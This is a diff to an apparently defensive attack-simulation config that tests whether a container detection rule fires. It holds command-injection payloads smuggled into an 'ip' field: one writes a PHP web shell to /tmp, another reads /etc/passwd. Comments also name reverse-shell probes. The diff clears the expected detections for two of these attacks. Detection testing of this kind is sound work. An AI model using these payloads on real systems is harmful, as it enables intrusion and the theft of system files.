@@ -395,11 +395,7 @@ attacks:
         ip: "127.0.0.1;echo '<?php system($_GET[c]); ?>' > /tmp/shell.php 2>/dev/null; echo webshell_written"
     successIndicators:
       - bodyContains: "webshell_written"
-    expectedDetections:
-      - ruleID: R0001
-        ruleName: Unexpected process launched
-        containerName: mywebapp-app
-        command: echo
+    expectedDetections: []
 
   # T1059.004 — Reverse shell attempt (bash /dev/tcp)
   # Standard CTF/pentest technique. Connection will fail (no listener)
@@ -448,11 +444,7 @@ attacks:
         ip: "127.0.0.1;php -r \"echo file_get_contents('php://filter/convert.base64-encode/resource=/etc/passwd');\" 2>/dev/null || echo filter_failed"
     successIndicators:
       - statusCode: 200
-    expectedDetections:
-      - ruleID: R0001
-        ruleName: Unexpected process launched
-        containerName: mywebapp-app
-        command: php
+    expectedDetections: []
 
   # T1059 — Python reverse shell probe (if python available)
   - name: cmdinject-python-revshell
